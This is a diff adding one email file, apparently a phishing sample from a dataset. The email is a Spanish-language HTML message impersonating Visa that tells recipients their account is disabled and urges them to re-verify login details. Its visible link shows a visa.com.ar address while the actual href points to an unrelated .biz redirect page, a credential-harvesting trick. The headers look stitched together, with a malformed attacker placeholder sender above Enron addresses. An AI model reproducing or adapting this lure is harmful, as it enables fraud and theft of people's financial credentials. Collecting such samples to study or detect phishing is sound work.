@@ -1,0 +1,59 @@
+From
+: example@attack.com
+From: johnny.mcgee@enron.com
+To: hunter.shively@enron.com, jonathan.mckay@enron.com, laura.luce@enron.com, 
+Subject: Su cuenta esta inhabilitada
+Message-ID: <1a9d24fe3b5eb6aff3d1c3939e12d858@popcodelast.ws>
+X-Priority: 3
+X-Mailer: PHPMailer (phpmailer.sourceforge.net) [version ]
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
+Content-Type: text/html; charset="iso-8859-1"
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 2609
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="es-mx">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Pagina nueva 1</title>
+</head>
+
+<body>
+
+<p style="margin: 0px; padding: 0px; display: block; line-height: normal; color: rgb(69, 69, 69); font-family: Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: -webkit-auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); ">
+<img src="http://www.apeepa.com/bank_logo/582861429logo-visa1.jpg" width="100" border="0" height="100" style="border: 0px; "><font face="Arial"><span class="Apple-converted-space"></span><br>
+<span class="yiv1345520117ecxEstilo5">Codigo del mensaje: #199</span></font><span class="yiv1345520117ecxEstilo5"><font face="Arial">5651</font></span></p>
+<p style="margin: 0px; padding: 0px; display: block; line-height: normal; color: rgb(69, 69, 69); font-family: Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: -webkit-auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); ">
+<font face="Arial">25/05/2012</font></p>
+<p style="margin: 0px; padding: 0px; display: block; line-height: normal; color: rgb(69, 69, 69); font-family: Arial, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: -webkit-auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); ">
+<font face="Arial"><em style="font-style: italic; ">Estimado Socio;<span class="Apple-converted-space"></span><br>
+<br>
+Como parte de nuestras medidas de seguridad, examinamos peridicamente la 
+actividad del sistema de<span class="Apple-converted-space"></span><span class="yiv1345520117ecxEstilo1">Visa 
+Home</span><span class="yiv1345520117ecxEstilo2">.</span></em><span class="Apple-converted-space"></span><br>
+<br>
+<em style="font-style: italic; ">Durante una reciente investigacin,<span class="Apple-converted-space"></span><br>
+hemos observado un problema de su cuenta en lnea.<span class="Apple-converted-space"></span></em><br>
+<br>
+<em style="font-style: italic; ">Para evitar la interrupcin de la misma y de 
+otros servicios provistos<span class="Apple-converted-space"></span><br>
+por Visa le pedimos activar nuevamente su cuenta en un solo paso.<span class="Apple-converted-space"></span></em><br>
+<br>
+<em style="font-style: italic; ">Le solicitamos que haga clic en la direccin 
+Web remarcada en<span class="Apple-converted-space"></span><span class="yiv1345520117ecxEstilo4">azul</span><strong style="font-weight: bold; "><span class="Apple-converted-space"></span></strong>en<span class="Apple-converted-space"></span><br>
+la parte inferior de este mensaje y verifique los datos de ingreso.<span class="Apple-converted-space"></span></em><br>
+<br>
+<span class="yiv1345520117ecxEstilo6">Direccin Web<br>
+<a rel="nofollow" target="_blank" style="text-decoration: underline; color: rgb(35, 71, 134); outline: 0px; " href="http://activasegu.biz/redir.html">
+http://www.visa.com.ar/OperacionesSegura.pj/5111.do=1511121</a></span><br>
+<br>
+<span class="yiv1345520117ecxEstilo9">Juan Cevallos</span><span class="Apple-converted-space"></span><br>
+<br>
+<span class="yiv1345520117ecxEstilo8">Departamento de Verificaciones<span class="Apple-converted-space"></span><br>
+ Copyright 2012 Visa S.A. Todos los derechos reservados.</span></font></p>
+<br class="Apple-interchange-newline">
+</body></html>
